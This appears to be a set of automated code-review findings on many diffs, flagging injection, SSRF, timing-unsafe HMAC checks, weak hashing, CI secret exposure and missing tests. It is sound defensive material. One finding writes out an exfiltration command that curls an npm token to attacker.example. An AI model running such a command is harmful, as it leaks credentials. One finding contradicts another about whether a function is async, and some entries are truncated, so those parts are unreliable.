findings.body: The new search_customers function builds SQL via f-string interpolation of `term` and `status` directly into the query string, bypassing the parameterised `execute` helper convention used elsewhere (e.g. get_customer). No test exists for this function, so a regression (or the injection risk itself) would not be caught by any existing test suite. At minimum, a test verifying that execute is called with parameterised placeholders and a params tuple — matching the pattern in get_customer — would catch this class of defect.

findings.title: verify_endpoint skips the ALLOWED_HOSTS check the send path enforces
findings.body:
The existing send path parses the host and rejects anything outside `ALLOWED_HOSTS` before calling `requests.post` (lines 8-10). `verify_endpoint` takes a tenant-supplied URL straight to `requests.get` with no such check, so the destination invariant this module establishes is enforced on one entry point and not the other. A tenant registering a webhook target can make the server issue GETs to internal addresses (link-local metadata endpoints, loopback admin ports, internal service hosts) and learn the result via the returned status code. Extract the host validation from the send path into a shared helper and call it here before issuing the request; also pass `allow_redirects=False`, since the default of True lets an allowed host redirect the request to a disallowed one after validation has already passed.

_Also raised by the security agent:_ verify_endpoint bypasses the ALLOWED_HOSTS check (SSRF)

findings.title: New verify_endpoint has no test and bypasses host allowlist check
findings.body: verify_endpoint issues a GET to an arbitrary URL without the ALLOWED_HOSTS check applied to the sibling function above (lines 8-10). There is no test in this diff exercising verify_endpoint, so nothing would fail if this function were changed to behave incorrectly (e.g. returning the wrong thing, not handling exceptions, or being called with unvalidated URLs). Add a test that calls verify_endpoint and asserts on its actual return value/behavior, including a case with a disallowed host if that check is intended to apply.

findings.title: verify_endpoint raises instead of reporting unreachable endpoints
findings.body: A function named `verify_endpoint` that returns a status code reads like it reports whether a target is reachable, but `requests.get` raises `ConnectionError`, `Timeout`, `TooManyRedirects` or `MissingSchema` for exactly the inputs a verification step exists to catch — a bad hostname, a dead port, a URL with no scheme. Callers will get an exception where they expect an int. Either catch `requests.RequestException` and return a sentinel/False, or document that the function signals failure by raising so callers wrap it.

findings.title: Customer invoice bucket created with all public access blocks disabled
findings.body:
`aws_s3_bucket.invoices` (`acme-customer-invoices`) is paired with an `aws_s3_bucket_public_access_block` that sets all four guardrails to `false`. That turns off the account-level safety net for this bucket: any ACL (`public-read`), any bucket policy with `Principal: "*"`, or any `ignore_public_acls` bypass will take effect immediately rather than being blocked. For a bucket whose name indicates customer invoices (PII / billing data), these four flags should be `true`, which is also the AWS default for new buckets.

The entry point is not request data but the Terraform configuration itself: the sink is the S3 public-access-block API, and the effect is that the control protecting an invoice bucket is switched off. I do not see an ACL or bucket policy in the diff that actually grants anonymous read, so exposure is not yet proven from this diff alone — but the guardrail whose entire purpose is to prevent that has been removed, and the bucket name is globally predictable.

Suggested fix: set `block_public_acls`, `block_public_policy`, `ignore_public_acls` and `restrict_public_buckets` to `true` for the invoices bucket (or drop the resource entirely so the AWS defaults apply), and add server-side encryption plus versioning. Separately, this bucket is unrelated to the "public assets bucket for the marketing site" described in the PR and should be reviewed on its own.

_Also raised by the correctness agent:_ Customer-invoices bucket created with all public access blocks disabled

findings.title: verify_acmepay compares HMAC with `==` instead of compare_digest
findings.body:
`verify_acmepay` computes the expected HMAC-SHA256 hex digest and then compares it to the caller-supplied `header` using `==`. Python's string `==` short-circuits on the first differing byte, so comparison time leaks how many leading hex characters of the signature are correct. An attacker who can replay a chosen body to the webhook endpoint many times and measure response latency can recover the valid signature byte-by-byte without knowing the shared secret, then forge webhook events.

The function directly above it (`verify_stripe`, line 7) already does the right thing. Change line 12 to:

```python
return hmac.compare_digest(expected, header)
```

If `header` may be `None` or non-str, normalise it first (`compare_digest` requires both operands to be ASCII-only str or bytes).

_Also raised by the correctness agent:_ verify_acmepay compares HMAC with == instead of compare_digest

findings.title: verify_acmepay contract contradicts verify_stripe pattern
findings.body:
The `verify_acmepay` function uses `expected == header` (line 12) for comparison, while the parallel `verify_stripe` function uses `hmac.compare_digest()` (line 7). For webhook verification functions in the same module, callers would reasonably expect both to provide the same level of protection against timing attacks. The unsafe comparison on line 12 breaks this implicit contract.

Use `hmac.compare_digest(expected, header)` instead of `expected == header` to match the established pattern and protect against timing-based attacks on the shared secret.

findings.title: New verify_acmepay function has no accompanying test
findings.body: verify_acmepay is added with no test in this diff. In particular, a test asserting correct/incorrect signatures would pass regardless of whether `==` or `hmac.compare_digest` is used, so even if tests were added naively they would not catch the timing-side-channel difference from verify_stripe. No test exists in this change to verify the function's basic pass/fail behavior at all.

findings.title: 500 handler returns raw exception text and stack trace to the client
findings.body:
`handle()` now serialises `str(exc)` and `traceback.format_exc()` into the HTTP 500 response body. Anything an unauthenticated caller can make fail becomes an information-disclosure oracle: absolute filesystem paths, module and framework versions, internal hostnames, and source lines from the frames. Exception messages commonly embed the offending data too \u2014 DB driver errors quote the failing SQL, connection errors quote DSNs (which may include credentials), and HTTP client errors quote internal URLs. An attacker who can trigger errors by varying input can map the internals and pick targeted follow-ups.

The exception is already captured server-side by `log.exception("request failed")` on line 8, which is where on-call should read it. Keep the client-facing body opaque and give operators a handle instead, e.g. generate a correlation id, log it alongside the traceback, and return `{"error": "internal error", "request_id": rid}, 500`. If a debug-time echo is genuinely wanted, gate it behind an explicit non-production config flag that defaults to off.

Secondary note: `traceback.format_exc()` formats whatever is in `sys.exc_info()`, not necessarily `exc`. If `handle()` is ever called outside an active `except` block it will emit `"NoneType: None"` \u2014 another sign the traceback belongs in the log path, not the response.

_Also raised by the correctness agent:_ format_exc() ignores `exc` and yields "NoneType: None" outside an except block

_Also raised by the correctness agent:_ 500 response body shape changed: new key and non-constant `error` value

findings.title: No test covers the new error-response contents
findings.body: handle() now returns str(exc) and a full traceback in the response body instead of a generic message. There is no test asserting the shape or content of this response, so a regression (e.g. re-introducing traceback leakage after a future fix, or accidentally omitting the traceback/error fields) would go undetected. Add a test that calls handle() with a known exception and asserts on the returned dict's keys/values.

findings.title: Reset passwords hashed with unsalted MD5 instead of bcrypt
findings.body:
`hash_reset_password` stores a password-derived value as a single-round, unsalted MD5 digest, while `hash_password` two lines above uses bcrypt with a per-password salt. MD5 is fast enough that commodity GPUs try billions of candidates per second, and without a salt the digests are directly lookup-table/rainbow-table attackable and identical across users with the same password. Anyone who obtains the stored reset hashes (DB read, backup, log) recovers the plaintext for most real-world passwords.

If this value is a password chosen or set during reset, hash it the same way as any other password: `return hash_password(raw)`. If what you actually need is a one-time reset *token* rather than a password hash, generate it with `secrets.token_urlsafe()`, store only a SHA-256 of the token, give it an expiry, and compare with `hmac.compare_digest` — but name it accordingly, because the current name says password.

findings.title: Reset hash returns a format incompatible with bcrypt verification
findings.body: `hash_password` returns a bcrypt modular-crypt string (`$2b$...`), which is verified with `bcrypt.checkpw`. `hash_reset_password` returns a bare 32-char MD5 hex digest with no salt and no algorithm prefix. If both values land in the same stored password column, the existing verification path will either raise (`bcrypt.checkpw` rejects malformed hashes) or silently fail to authenticate users who went through the reset flow. If instead a separate comparison is used for reset hashes, it is unsalted and equal inputs collide across users. Either produce the reset value with `bcrypt.hashpw` so it round-trips through the same verifier, or store it in a distinct field with an explicit algorithm tag and a matching verify function.

findings.title: No test coverage for new hash_reset_password function
findings.body: hash_reset_password is a new public function with security-relevant behavior (used in a password reset flow) but no test exists in this diff verifying its output format, determinism, or handling of edge cases (e.g. empty string, non-ASCII input). If the hashing scheme were changed or broken, nothing would catch it.

findings.title: pull_request_target runs fork-controlled script with repo secrets
findings.body:
`pull_request_target` runs in the context of the base repository: it gets a `GITHUB_TOKEN` with write permissions and access to `secrets.*`, and (unlike `pull_request`) it runs automatically for forks with no maintainer approval gate. Line 12 then explicitly checks out `github.event.pull_request.head.sha` — the attacker's commit — and line 13 executes `./scripts/measure.sh` *from that checkout*, with `NPM_TOKEN` injected into its environment on line 15.

Entry point: the head commit of any fork pull request (anyone with a GitHub account). Sink: `run: ./scripts/measure.sh`, which is a file the attacker controls in that same commit. A one-line PR that rewrites `scripts/measure.sh` to `curl -d "$NPM_TOKEN" attacker.example` exfiltrates the npm publish token, and `$GITHUB_TOKEN` in the same environment can be used to push to the repository. Anything the script transitively invokes (npm lifecycle scripts, a Makefile, a lockfile-installed dependency) is equally attacker-controlled.

To get CI signal on forks safely, keep `on: pull_request` — it already runs for forks, just without secrets. If the size measurement genuinely needs a registry token, split it: an untrusted `pull_request` job that builds and uploads an artifact, plus a separate `workflow_run` job holding the secret that only reads the artifact and never executes fork code. If you must keep `pull_request_target`, do not check out the head ref and do not run scripts from it, and add a least-privilege `permissions:` block.

_Also raised by the correctness agent:_ pull_request_target checks out and runs untrusted fork code with secrets

findings.title: Cache key now requires JSON-serialisable context, not just hashable
findings.body: The old key `(template_source, tuple(sorted(context.items())))` accepted any hashable values — `datetime`, `Decimal`, `frozenset`, `uuid.UUID`, small dataclasses, enum members, etc. `json.dumps([template_source, context], sort_keys=True)` raises `TypeError: Object of type X is not JSON serializable` for all of those, so callers that previously rendered fine will now blow up inside `cached_render` before `_render` is ever reached. If a digest key is wanted, either pass `default=repr`/a custom encoder, or fall back to the old tuple key (or bypass the cache) when serialisation fails, rather than letting the `TypeError` escape.

findings.title: No test covers non-JSON-serializable context values
findings.body: The old key used tuple(sorted(context.items())), which works for any hashable value (e.g. datetime, custom objects, sets). The new implementation calls json.dumps(context), which raises TypeError for values that aren't JSON-serializable. This is a behavior change/regression for callers passing such context values, and none of the added tests use anything but plain ints, so nothing would fail if this regressed further or if serialization edge cases (e.g. NaN, non-string dict keys) produced silently different keys.

findings.title: No test asserts the constructed argv list, only the shell flag
findings.body: test_runs_without_a_shell only checks spy.last_call.kwargs["shell"] is False; it never inspects spy.last_call.args (or equivalent) to confirm that `name` and `directory` are passed as separate, unescaped list elements rather than interpolated into a single string. A regression that reassembled the command as a single formatted string (e.g. `[f"tar -czf ... {directory}"]`) while still passing shell=False would pass this test, defeating the entire point of the change (avoiding shell metacharacter injection via `directory`, which is never validated).

findings.title: `directory` is unvalidated — arbitrary paths can be archived
findings.body:
`name` is properly constrained by `SAFE_NAME.fullmatch` (line 9), but `directory` flows straight into the tar argv on line 12 with no validation. The `--` guard correctly prevents it from being parsed as a tar option, and `shell=False` rules out shell injection, so this is not command injection. The remaining exposure is file disclosure: a caller who controls `directory` can pass `/etc`, `/root`, or any path containing secrets, and the contents land in `/exports/<name>.tar.gz`, which — given the export-oriented directory name — is plausibly served back to the requester.

If `directory` originates from user input anywhere upstream, constrain it: resolve it with `os.path.realpath` and require it to sit under an allowed export root before invoking tar. If it is only ever an internal constant, this is not an issue.

Note: I could not see the caller of `create_archive` in this diff or in retrieved context, so I cannot confirm the entry point is attacker-reachable.

findings.title: Allowlist raises ValueError for names that previously worked
findings.body: `SAFE_NAME` permits only `[A-Za-z0-9_-]` and caps length at 64. Previously *any* string was interpolated into the shell command, so callers passing names containing `.` (e.g. `report.2024.01.01`), spaces, or longer than 64 characters succeeded. Those callers now get an uncaught `ValueError` at runtime — a new exception on an existing code path. Confirm no caller produces such names, or widen the class to include `.` and raise/remove the 64-char cap (which does not contribute to the traversal defence, since `/`, `.` and `..` are already excluded).

findings.title: `directory` is no longer word-split or glob-expanded
findings.body: Under `shell=True` the old command let the shell split `directory` on whitespace and expand globs, so a caller passing `"/srv/a /srv/b"` or `"/srv/data/*"` archived multiple paths. With list argv the whole string is one operand: a multi-path value now becomes a single non-existent path and `check=True` raises `CalledProcessError`, and a glob is passed to tar literally. If any caller relies on that, accept a sequence of directories and splat it into the argv instead.

findings.title: Tests depend on an undeclared `spy` fixture and may invoke real tar
findings.body: `test_runs_without_a_shell` takes a `spy` fixture that is not defined in this diff and no conftest is shown; if it does not exist or does not patch `subprocess.run`, the test errors or actually shells out to tar and writes `/exports/nightly.tar.gz`. `test_rejects_a_traversing_name` takes no fixture at all, so if the validation regressed it would execute a real `tar` with `check=True` rather than failing cleanly. Patch `subprocess.run` explicitly (e.g. via `monkeypatch`) in both tests, and also assert the first argument is a list so a regression back to a command string is caught.

findings.title: test_renders_empty_invoice asserts nothing
findings.body:
`test_renders_empty_invoice` calls `render(Invoice(lines=[]))` and then ends. The only failure mode it can detect is an uncaught exception; if `render` returns `None`, an empty string, a stray header, or garbage for the blank-invoice case, the test still passes. Add an assertion on the return value that pins the intended blank-invoice output, e.g. `assert render(Invoice(lines=[])) == ""` or whatever the renderer is specified to produce (total line only, etc.). As written the test gives false confidence that the blank-invoice case is covered.

_Also raised by the tests agent:_ test_renders_empty_invoice has no assertion at all

findings.title: Test only checks mock call_count, not actual rendered output
findings.body:
test_renders_line_items patches format_line and asserts only that it was called twice. It never checks what render() actually produced (e.g. that the formatted line items appear in the output). This would pass even if the line items were dropped, duplicated incorrectly, or joined wrong in the final output, as long as format_line is invoked twice.

_Also raised by the correctness agent:_ Line-item test verifies mock call count, not rendered output

findings.title: Failing boundary test deleted with no accompanying rounding fix
findings.body:
The PR title says "Fix the rounding and drop the failing test that was asserting the old behaviour", but this change touches exactly one file — the test file — and contains no change to `round_cents` or any production module. So either (a) the rounding behaviour was not actually fixed and the red test was simply deleted to make CI green, or (b) the fix lives elsewhere and was omitted from this PR. Either way, what lands here is a net loss of coverage.

`test_rounds_half_to_even` was the only assertion on the exact-half boundary (`Decimal("2.345")`), which is the single input where half-up and half-even rounding diverge and the one most likely to regress. The surviving `test_rounds_up_above_half` exercises a strictly-above-half input and will pass under either rounding mode, so it cannot detect the difference.

If the intended behaviour genuinely changed to half-up, replace the deleted test with one asserting the new expectation (`round_cents(Decimal("2.345")) == Decimal("2.35")`) and include the implementation change in this PR so reviewers can see the contract that callers depend on actually move. Do not leave the boundary unasserted.

_Also raised by the tests agent:_ Half-to-even rounding case removed with no replacement test

findings.title: Patch target misses the name actually used by send_with_retry
findings.body:
`notify/sender.py` does `from notify.transport import deliver`, so `deliver` is a module-level name in `notify.sender` resolved at import time. Patching `notify.transport.deliver` rebinds the attribute on the transport module only; `send_with_retry` still calls the original function. This test therefore invokes the real `deliver` three times (possible real I/O / flakiness) and only passes if the genuine implementation happens to return falsy \u2014 it does not verify the give-up path at all. Use `mocker.patch("notify.sender.deliver", return_value=False)`, matching the existing test on line 2, and ideally assert the mock was called three times so the retry count is actually covered.

_Also raised by the tests agent:_ Mock patches wrong target; test doesn't exercise retry logic

findings.title: csv_rows joins raw values, bypassing the csv_escape helper
findings.body:
`csv_rows` builds each line with `",".join(str(r.get(c, "")) for c in columns)` and never passes the value through `csv_escape`, which is defined immediately below for exactly this purpose. A field value containing a comma splits into two columns; a value containing a newline splits into two records. If the row dicts carry any user-supplied text (names, descriptions, free-text fields), whoever supplies that text controls the column and row structure of the exported file, which can corrupt downstream imports or smuggle extra records into a system that consumes the export.

Apply the helper in the comprehension: `",".join(csv_escape(str(r.get(c, ""))) for c in columns)`. Separately, `csv_escape` only tests for `,` and `"` \u2014 RFC 4180 also requires quoting when the value contains `\r` or `\n`, so extend the condition or replace both functions with the stdlib `csv` module, which handles quoting correctly.

_Also raised by the correctness agent:_ csv_escape misses newlines and raises TypeError on non-str input

findings.title: csv_rows never applies csv_escape, producing malformed CSV
findings.body: `csv_rows` renders each field with `str(r.get(c, ""))` and joins with `","`, with no quoting step. Any cell whose value contains a comma (or a double quote) will be emitted unquoted and will be parsed as two or more fields by any CSV reader, silently shifting every subsequent column on that row. The `csv_escape` helper added directly below in the same change does exactly the needed quoting but is never called. Pipe each field through it: `",".join(csv_escape(str(r.get(c, ""))) for c in columns)`.

findings.title: New CSV/JSON/PDF exporter functions lack any tests
findings.body: The repository has a precedent of testing exporter logic (test_csv_header_matches_columns for csv_header). This PR adds six new public functions (csv_rows, csv_escape, dump_streaming, dump_pretty, margins_for, usable_width) with non-trivial behavior (escaping rules, chunking, arithmetic on margins) but none are covered by any test. A bug in escaping (e.g. csv_escape not handling values that need quoting after replace) or in chunk boundaries would go undetected.

findings.title: Date-equality assertion is flaky across the UTC midnight boundary
findings.body:
`token.issued_at.date()` is captured inside `issue_token()` and then compared to a *second*, independently sampled `datetime.now(timezone.utc).date()`. If the two calls straddle 00:00 UTC, the dates differ and the test fails for reasons unrelated to the code under test. The same hazard applies to `assert not is_expired(token.expires_at)` on line 12, which re-reads the clock a third time. Pin the clock instead: capture `now = datetime.now(timezone.utc)` once (or inject/freeze it) and pass it explicitly, e.g. `is_expired(token.expires_at, now=now)`, mirroring the explicit `now=` used in the test above on line 6.

_Also raised by the tests agent:_ New test cannot catch expiry-window bugs

findings.title: `is_expired` called without the `now` argument the sibling test passes
findings.body: The existing test on line 6 calls `is_expired(..., now=...)` with an explicit keyword, while the new call on line 12 omits it entirely. That only works if `now` has a default; if it is a required keyword-only parameter, this test raises `TypeError` rather than testing anything. Either confirm the default exists or pass `now=` explicitly, which also fixes the clock-sampling issue above.

findings.title: No test covers the new expiry-rejection branch
findings.body: apply_coupon now raises CouponExpired when coupon.expires_at is in the past, but the only test updated (test_apply_coupon_reduces_total) uses expires_at=tomorrow(), which never triggers this branch. If the comparison were inverted, or expires_at were compared incorrectly (e.g. wrong timezone, wrong operator), or CouponExpired were never raised at all, no test would fail. Add a test that passes an already-expired coupon and asserts CouponExpired is raised.

findings.title: expires_at may be None or naive, raising TypeError instead of applying
findings.body: `coupon.expires_at < datetime.now(timezone.utc)` will raise `TypeError` in two reachable cases: (a) the coupon has no expiry (`expires_at is None`), which is the normal representation of a perpetual coupon, and (b) `expires_at` is a naive datetime, since Python refuses to compare naive and aware datetimes. Either turns a valid coupon application into an opaque `TypeError` rather than a discount or a `CouponExpired`. Guard explicitly: `if coupon.expires_at is not None and coupon.expires_at < now`, and normalise naive values to UTC before comparing.

findings.title: Blocking requests.get inside async fetch_plan_limits stalls the event loop
findings.body:
`fetch_plan_limits` is a coroutine, so callers will `await` it from the event loop, but its body makes a synchronous `requests.get` with a 5s timeout. That call blocks the entire event loop thread — every other in-flight request on the same worker is frozen for up to 5 seconds whenever billing.internal is slow. The coroutine also contains no `await`, so marking it `async` buys nothing except the false impression that it yields.

Use the existing async pattern in this module: take (or construct) an `httpx.AsyncClient` and `await client.get(...)`, as `fetch_plan` on lines 5-7 already does. If the synchronous client is unavoidable, drop `async` and dispatch it via `anyio.to_thread.run_sync`/`loop.run_in_executor` at the call site.

findings.title: New fetch_plan_limits has no test coverage
findings.body: fetch_plan_limits is declared async but uses the blocking `requests.get` call, which will block the event loop when awaited from async request handling code. There is no test in this diff exercising this function, so a regression (wrong URL, wrong timeout, missing await handling, or the blocking behavior itself) would go undetected.

findings.title: tenant_id interpolated into internal billing URL without encoding
findings.body:
`fetch_plan_limits` builds the request URL with an f-string: `f"https://billing.internal/limits/{tenant_id}"`. If `tenant_id` originates from a request parameter (the function is described as being called during request handling), a value such as `../../admin/keys` or `1?force=true` or `1#` lets a caller reach paths and query strings on the internal billing host that were never intended to be exposed — `requests` resolves `..` segments and treats `?`/`#` as delimiters. Because `billing.internal` is an internal, likely unauthenticated-to-the-network service, the blast radius is whatever else that host serves.

Fix by passing the value as an opaque, encoded segment, e.g. `urllib.parse.quote(str(tenant_id), safe="")`, and/or validating `tenant_id` against the expected shape (integer or UUID) before it reaches the URL.

findings.title: Misleading function name: `fetch_plan_limits` is not async
findings.body: The function `fetch_plan_limits` is named to match the async pattern established by `fetch_plan` above it (both start with `fetch_` and live in the same module), but it is not declared `async` and uses the synchronous `requests` library instead of the async `httpx` client. A caller expecting an async function would pass it to `await` and face a runtime error. Rename to `get_plan_limits` or similar to signal that it is synchronous, or refactor to use `httpx.AsyncClient` and make it async.

findings.title: Bare `except:` swallows BaseException and logs nothing
No test covers the new non-fatal exception handling
findings.body: The change alters push_metrics so that any exception from _client.send is swallowed and None returned instead of propagating. No test in this diff exercises the case where _client.send raises, so nothing would catch a regression (e.g. if the bare except were removed, or if it accidentally also swallowed exceptions from unrelated code and masked real failures). A test that mocks _client.send to raise and asserts push_metrics returns None without raising would confirm the intended behavior.

findings.title: try_consume reads and writes _counters without _lock, racing across await
findings.body:
`try_consume` reads `_counters.get(tenant, 0)` at line 15, checks the limit at line 16, then awaits at line 18 before writing at line 19 — all without acquiring `_lock`, which the sibling `consume` (line 9) does hold for exactly this state.

Two concrete failures:

1. Limit bypass. Any `await` is a scheduling point, so N coroutines can each pass the line 16 check against the same stale `current` and then each write `current + cost`. With `LIMIT = 1000` and `cost = 600`, two concurrent callers both return `True`.
2. Lost update. Line 19 assigns an absolute value computed before the await rather than incrementing. Any `consume()` that commits during the await window is silently overwritten, so the counter can go *down* and previously-charged cost disappears.

Fix by doing the whole read-check-write under the existing lock and by incrementing from a fresh read rather than the pre-await snapshot:

```python
async def try_consume(tenant, cost):
    async with _lock:
        current = _counters.get(tenant, 0)
        if current + cost > LIMIT:
            return False
        _counters[tenant] = current + cost
        return True
```

(If the `await asyncio.sleep(0)` at line 18 is a placeholder for real I/O, that I/O must happen outside the critical section and the counter must be re-read and re-checked after it.)

_Also raised by the security agent:_ Rate limit bypassable: check-then-act outside the lock in try_consume

findings.title: No test covers concurrent try_consume exceeding LIMIT
findings.body: try_consume reads _counters (line 15), awaits asyncio.sleep(0) (line 18), then writes (line 19) without acquiring _lock, unlike consume() which uses `async with _lock`. This is a classic check-then-act race: two concurrent calls can both read the same current value before either writes, letting the tenant exceed LIMIT. No test in this diff exercises concurrent calls to try_consume, so this regression would ship unnoticed.

findings.title: Return shape change breaks tuple-unpacking caller in reports/weekly.py
findings.body:
`lookup_user` now returns `{"name": ..., "email": ..., "tier": ...}` instead of the `(name, email)` tuple. The existing caller `render_row` in `reports/weekly.py` does `name, email = lookup_user(user_id)`. Unpacking a dict yields its keys, and there are three of them, so this raises `ValueError: too many values to unpack (expected 2)` on every call — and even with two keys it would silently bind key strings rather than values.

Either update all callers in the same change (`u = lookup_user(id); u["name"], u["email"]`), or keep backward compatibility by returning a `NamedTuple`/`dataclass` that still unpacks as `(name, email)`. Also grep for other callers beyond `reports/weekly.py`; only one was visible here.

findings.title: Docstring contradicts new return type
findings.body:
The docstring promises `(name, email)` but the function now returns `{"name": ..., "email": ..., "tier": ...}`. Callers like `reports/weekly.py:6` that unpack the return value as a tuple will break immediately. Update the docstring to reflect the new dict return type and include the newly-added `tier` field.

_Also raised by the correctness agent:_ Docstring still documents the old (name, email) tuple contract

findings.title: Return type change breaks public callers
findings.body: This is a breaking change to a public function's contract. The return type changed from tuple to dict, which breaks existing callers that unpack the result as `name, email = lookup_user(...)` (as seen in reports/weekly.py). If callers cannot be updated atomically, this needs migration planning or a new function.

findings.title: No test covers callers unpacking lookup_user's return value
findings.body: lookup_user now returns a dict instead of a (name, email) tuple, but render_row in reports/weekly.py does `name, email = lookup_user(user_id)`, which will raise (or silently misbehave) against a dict. There is no test in this diff, nor evident in the repo, that calls lookup_user and checks its return shape or exercises render_row end-to-end, so this breaking change would ship without any failure signal.

findings.title: WriteSettlement always returns nil after a failed insert
findings.body:
The `db.Exec` error is captured in a scope-local `err` inside the `if` statement and only logged. Lines 18–19 then declare a fresh `var err error` (always nil) and return it, so `WriteSettlement` reports success even when the settlements row was never written. Combined with the early `return err` for validation failures on line 13, the function's error contract is inconsistent: callers reasonably assume a nil return means the row is persisted, and an end-of-day batch will silently drop settlements.

If the intent really is log-and-continue, make that explicit and drop the misleading return value (or return a sentinel the caller can count); otherwise propagate the insert error: `if _, err := db.Exec(...); err != nil { log.Printf(...); return err }` and delete lines 18–19.

findings.title: WriteSettlement has no test covering its error paths
findings.body: WriteSettlement introduces new branching behavior (validation failure returns early, insert failure is only logged, and the final return is a fresh nil `err` variable that never reflects the insert error). No test file is included in this diff, so a regression here — such as the insert error being silently discarded even though it's logged — would not be caught by any test. At minimum, tests should assert that (1) a validation error is propagated, and (2) the return value correctly reflects (or intentionally does not reflect) the insert error.

findings.title: Mutable default argument accumulates results across calls
findings.body:
`attempted=[]` is evaluated once at function definition time, so every call that does not pass `attempted` explicitly shares and mutates the same list object. The first call returns the recipients that failed; the second call returns those plus its own failures, and so on for the process lifetime. Callers that treat the return value as "recipients that failed in this batch" (e.g. to alert on, or to re-enqueue) will get steadily growing, duplicated results, and the list grows unboundedly in a long-running service.

Use `attempted=None` and build the list inside the function:

```python
def send_with_retries(recipients, attempted=None):
    attempted = [] if attempted is None else attempted
    ...
```

_Also raised by the security agent:_ Shared mutable default leaks recipients across unrelated calls

findings.title: No test covers send_with_retries or its mutable-default bug
findings.body: send_with_retries uses attempted=[] as a default argument, which is shared and mutated across calls, silently accumulating failed recipients from previous invocations. No test exists in this diff to exercise this function, so a test calling it twice with default arguments (which would reveal stale entries from a prior call) is entirely absent. Add a test that calls send_with_retries multiple times without passing attempted and asserts the returned list only contains recipients from the current call.

findings.title: Rounding comparison changed from >= to > inside a rename-only PR
findings.body: `calc_rounding` returned `1 if line.remainder_cents >= 0.5 else 0`; the renamed `compute_rounding` returns `1 if line.remainder_cents > 0.5 else 0`. An exact remainder of 0.5 cents now rounds down to 0 instead of up to 1, changing monetary results for the most common half-cent case (half-up rounding is the usual billing convention, and exactly .5 is not rare when splitting amounts in two). Since the PR description says this is a rename for consistency, this behaviour change is either unintended or undeclared. Restore `>=`, or if the change is deliberate, split it into its own change with a test covering `remainder_cents == 0.5`.

findings.title: Boundary-changing edit hidden in a rename has no test coverage
findings.body: This PR is described as a pure rename, but compute_rounding's comparison changed from `line.remainder_cents >= 0.5` to `> 0.5`. That flips behavior for the exact boundary value 0.5 (previously rounded up, now does not). No test file is included in this diff, so if this change is a mistake (or intentional but unverified), nothing exercises the case remainder_cents == 0.5 to catch a regression.

findings.title: Module docstring uses outdated terminology
findings.body: The module docstring refers to 'Line-item calculators' but the functions have been renamed from `calc_*` to `compute_*`. The docstring should be updated to reflect the new naming convention. Consider changing it to 'Line-item computers' or 'Line-item computation functions' to match the new function names and avoid misleading readers about the naming pattern used in this module.

findings.title: page_of_sorted returns one fewer item than page_of
findings.body:
`page_of_sorted` uses `start + PAGE_SIZE - 1` as the slice endpoint (line 12), while `page_of` uses `start + PAGE_SIZE` (line 6). This means `page_of_sorted` returns one fewer item per page than `page_of`, breaking the implicit contract that both functions page the same data consistently. A caller expecting the same page size from both functions will get incorrect results. Fix line 12 to use `start + PAGE_SIZE` to match `page_of`'s behaviour.

_Also raised by the correctness agent:_ Off-by-one slice drops one record per page in page_of_sorted

findings.title: New paginated+sorted export function has no test coverage
findings.body: page_of_sorted is new logic with a likely off-by-one bug (slice end is start + PAGE_SIZE - 1, dropping the last record of every page except possibly page 0). No test accompanies this change, so nothing would catch this regression or verify correct page boundaries, sort order, or edge cases like the last partial page or duplicate keys.

findings.title: Removed None guard: AttributeError when purchase_order is None
findings.body:
`Invoice.purchase_order` is typed `str | None` and documented as optional ("only set for customers on invoicing terms, which is roughly one account in twenty"). The type does not cover the nil case — it explicitly includes it. Calling `.upper()` unconditionally will raise `AttributeError: 'NoneType' object has no attribute 'upper'` for the ~95% of invoices without a PO, breaking header rendering entirely for those. Restore the conditional append (or use a fallback such as `invoice.purchase_order or ""` if an empty PO line is genuinely wanted).

_Also raised by the docs agent:_ Public function contract changed without documentation.

findings.title: Function now requires non-null purchase_order but does not document this.
findings.body: The `header_lines()` function previously handled optional `purchase_order` via a null check on lines 3-4. The refactored version on lines 4-5 calls `.upper()` directly without a guard, making the field mandatory. However, the `Invoice` class documents that `purchase_order` is optional and only set for roughly one account in twenty. A caller following the documented contract of `Invoice` and passing an instance with `purchase_order=None` will now get an `AttributeError`. The function needs a docstring or a comment explaining it requires `purchase_order` to be non-None, or the null check should be restored.

findings.title: No test covers purchase_order=None after guard removal
findings.body: header_lines now unconditionally calls invoice.purchase_order.upper(), but models/invoice.py documents purchase_order as optional (str | None) and states it's unset for ~19/20 accounts. This diff removes the None check without any test showing what happens when purchase_order is None. If this behaviour change is wrong (i.e. None should still be handled), nothing here would catch it — there's no test exercising an invoice with purchase_order=None.

findings.title: File handle leaks on the header-mismatch and exception paths
findings.body: `fh = open(path)` is only closed on the single success path at line 16. When the header check at line 13 fails, the function returns at line 14 with the handle still open; likewise any exception raised by `next(reader)` (line 12) or `list(reader)` (line 15) escapes without closing. Since header-mismatch is the *expected* rejection path for partner catalogues, this leaks a descriptor on every bad file, which on a batch import will exhaust the process's descriptor limit. Wrap in `with open(path) as fh:` as `read_rows` already does on line 5.

findings.title: New read_validated function has no tests, including its leaking early-return
findings.body: read_validated is added with no accompanying test. In particular, the early `return None` at line 14 (when header != expected_header) skips the `fh.close()` on line 16, so nothing exercises or catches this resource leak, nor does anything verify the success path returns the expected rows. Add a test that calls read_validated with a mismatched header and asserts the file handle is closed (e.g. via mock/spy on close, or observing no lingering open descriptor), plus a test for the matching-header success path.

findings.title: Retry wraps non-idempotent charge() — duplicate charges on transient failure
findings.body:
`@retry(attempts=3)` is applied to `charge()`, but `billing/gateway.py` documents `charge` as "NOT idempotent: each call creates a new charge." Any failure that occurs after the gateway has already accepted the POST (timeout, dropped connection, 5xx on a partially-processed request) will be retried and will create a second and third charge against the customer's card. Money moves, and it is hard to unwind.

The gateway docstring names the fix: it supports an `Idempotency-Key` header. Generate a key once per logical charge attempt (outside the retry, e.g. a caller-supplied or per-invocation UUID), pass it through `charge()` so all three attempts share it, and only then is the retry safe. Alternatively, restrict the retry to errors that provably occurred before the request was accepted (e.g. connection-establishment errors only), or drop the retry on this path entirely and leave `fetch_charge` — a genuinely safe GET — as the only retried call.

_Also raised by the security agent:_ Retry wraps non-idempotent charge() with no Idempotency-Key

findings.title: No test guards retrying a non-idempotent charge call
findings.body: charge_card wraps billing.gateway.charge, which is explicitly documented as NOT idempotent (each call creates a new charge) and supports an Idempotency-Key to make retries safe. The new @retry(attempts=3) decorator will re-issue the POST /charges call on transient failures without passing an idempotency key, risking duplicate charges on flaky networks. There is no test in this diff exercising the retry-on-failure path for charge_card (e.g. simulating a transient failure then success, or verifying an idempotency key is passed), so this behavior change could regress or ship broken with nothing failing.

findings.title: Naive datetime.now() subtracted from tz-aware expires_at raises TypeError
findings.body:
